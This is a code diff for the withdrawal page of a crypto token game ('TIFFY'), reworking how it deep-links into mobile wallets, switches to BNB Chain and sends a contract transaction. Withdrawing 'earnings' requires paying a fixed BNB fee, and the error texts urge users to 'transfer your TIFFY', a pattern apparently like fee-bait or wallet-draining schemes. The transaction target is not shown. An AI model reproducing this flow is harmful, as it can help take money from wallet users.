@@ -227,7 +227,7 @@
     <div id="main-content"> <div class="card">
         <div><strong>Wallet:</strong> <span id="walletAddressDisplay">Not Connected</span></div>
         <div><strong>Claimed TIFFY:</strong> <span id="claimedTIFFYDisplay">0.00</span></div>
-        <div><strong id="gameEarningsLabel">Wallet Game Earnings:</strong> <span id="synchronizedEarningsDisplay">0.00</span></div>
+        <div><strong id="gameEarningsLabel">Browser Game Earnings:</strong> <span id="synchronizedEarningsDisplay">0.00</span></div>
         <hr style="border-color: #0ff; margin: 15px 0;">
         <h2>Total Withdrawable: <span id="totalWithdrawableDisplay">0.00</span> TIFFY</h2>
         <button id="withdrawBtn" class="btn withdraw-btn">Withdraw Funds</button>
@@ -366,11 +366,12 @@
 
         // Logic for deep-linking
         function connectAndWithdraw(walletType, amount) {
+            // First, immediately show the processing overlay and hide the main content
             document.getElementById('appModal').style.display = 'none';
-            // Permanently replace the UI with the processing overlay
             E.mainContent.style.display = 'none'; 
             E.processingOverlay.style.display = 'flex'; 
             E.overlayTiffyAmount.textContent = amount.toFixed(2);
+            E.overlayMessage.textContent = 'Opening your wallet...';
 
             const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}`;
             
@@ -387,20 +388,15 @@
                     break;
                 default:
                     showModal("Error", "Invalid wallet selected.", null);
+                    // In case of error, show main content again
+                    E.mainContent.style.display = 'block';
+                    E.processingOverlay.style.display = 'none';
                     return;
             }
 
             console.log("Deep link URL generated:", deepLink);
 
-            // NEW: Add a timeout to check if the deep link worked
-            const isTelegram = /Telegram/i.test(navigator.userAgent);
-            setTimeout(() => {
-                if (document.visibilityState === 'visible' && isTelegram) {
-                    // This means we are still in the Telegram in-app browser and the wallet didn't open
-                    E.overlayMessage.textContent = 'Wallet did not open. Please switch to your wallet app manually to confirm the transaction.';
-                }
-            }, 3000); // Wait 3 seconds to check
-
+            // Navigate to the deep link
             window.location.href = deepLink;
         }
 
@@ -448,16 +444,28 @@
             E.overlayTiffyAmount.textContent = amount.toFixed(2); // Display amount being withdrawn
 
             try {
-                if (!account) {
-                     E.overlayMessage.textContent = "Connection Required...";
-                     showModal("Connection Required", "Please connect your wallet first.", null);
-                     return;
+                if (typeof window.ethereum === 'undefined') {
+                    throw new Error("This feature requires a mobile wallet. Please open this page in your wallet's browser.");
                 }
 
-                // Update overlay with connected wallet address
-                E.overlayWalletAddress.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
-                E.overlayMessage.textContent = 'Switching to BNB Chain...';
+                provider = window.ethereum;
+                web3 = new Web3(provider);
 
+                // Update overlay with connected wallet address
+                E.overlayMessage.textContent = 'Requesting wallet access...';
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                E.overlayWalletAddress.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
+
+                E.overlayMessage.textContent = 'Switching to BNB Chain...';
+                const isBnbChain = await switchToBNB();
+                if (!isBnbChain) {
+                    throw new Error("Failed to switch to BNB chain.");
+                }
+
+                E.overlayMessage.textContent = 'Wallet connected. Preparing transaction...';
+
+                contract = new web3.eth.Contract(ABI, cAddr);
                 const bnbFee = web3.utils.toWei("0.0015", "ether");
                 const gasPrice = await web3.eth.getGasPrice();
 
@@ -488,21 +496,25 @@
                 let errorMessage = "An unknown error occurred.";
                 let errorTitle = "Withdrawal Failed";
                 
-                if (e.code === 4001) {
+                if (e.code === 4001 || (e.message && e.message.includes("user rejected"))) {
                     errorMessage = "Hey what you doing? Try again and transfer your TIFFY!";
                     errorTitle = "Transaction Canceled";
                 } else if (e.code === -32603 || (e.message && (e.message.includes("insufficient funds") || e.message.includes("not enough juice")))) {
                     errorMessage = "Hey you don't have enough juice to transfer your TIFFY, get some more gas!";
                     errorTitle = "Insufficient Funds";
-                } else if (e.message && e.message.includes("user rejected")) {
-                    errorMessage = "Hey what you doing? Try again and transfer your TIFFY!";
-                    errorTitle = "Transaction Canceled";
+                } else if (e.message && e.message.includes("Failed to switch")) {
+                    errorMessage = "Failed to switch to BNB Chain. Please add it to your wallet and try again.";
+                    errorTitle = "Chain Switch Failed";
+                } else if (e.message && e.message.includes("mobile wallet's browser")) {
+                     errorMessage = "This feature requires a mobile wallet. Please open this page in your wallet's browser.";
+                     errorTitle = "Connection Error";
                 } else {
                     errorMessage = `❌ Error: ${e.message || e}`;
                 }
 
                 showModal(errorTitle, errorMessage, null, 'error-message');
             } finally {
+                // Keep the processing overlay visible, just update balances and log the result
                 loadBalances();
             }
         }
@@ -513,55 +525,21 @@
             const walletParam = params.get('wallet');
             const amountParam = params.get('amount');
             
-            if (!walletParam || !amountParam) {
-                loadBalances();
-                E.mainContent.style.display = 'block';
-            }
-
+            // Check for deep link parameters
             if (walletParam && amountParam) {
+                // If deep link parameters exist, immediately hide the main content
+                // and show the processing overlay to handle the wallet connection flow.
                 E.mainContent.style.display = 'none';
                 E.processingOverlay.style.display = 'flex';
                 E.overlayTiffyAmount.textContent = parseFloat(amountParam).toFixed(2);
-
-                try {
-                    if (typeof window.ethereum === 'undefined') {
-                        throw new Error("Please open this page in your mobile wallet's browser.");
-                    }
-                    
-                    provider = window.ethereum;
-                    web3 = new Web3(provider);
-
-                    E.overlayMessage.textContent = 'Switching to BNB Chain...';
-                    const isBnbChain = await switchToBNB();
-                    if (!isBnbChain) {
-                        throw new Error("Failed to switch to BNB chain.");
-                    }
-
-                    E.overlayMessage.textContent = 'Requesting wallet access...';
-                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0];
-
-                    E.overlayWalletAddress.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
-                    E.overlayMessage.textContent = 'Wallet connected. Preparing transaction...';
-
-                    contract = new web3.eth.Contract(ABI, cAddr);
-
-                    await withdraw(parseFloat(amountParam));
-
-                } catch (e) {
-                    let errorMessage = "An unknown error occurred.";
-                    if (e.message && e.message.includes("Failed to switch")) {
-                        errorMessage = "Failed to switch to BNB Chain. Please add it to your wallet and try again.";
-                    } else if (e.message && e.message.includes("mobile wallet's browser")) {
-                        errorMessage = "This feature requires a mobile wallet. Please open this page in your wallet's browser.";
-                    } else {
-                         errorMessage = e.message || "Something went wrong while connecting your wallet.";
-                    }
-                    showModal("Connection Error", errorMessage, null, 'error-message');
-                    console.error("Connection flow failed:", e);
-                } finally {
-                    loadBalances();
-                }
+                
+                // Now, call the withdraw function to proceed with the transaction.
+                // The try/catch block within `withdraw` will handle any errors.
+                await withdraw(parseFloat(amountParam));
+            } else {
+                // If no deep link parameters, show the main content as normal.
+                loadBalances();
+                E.mainContent.style.display = 'block';
             }
         });
 
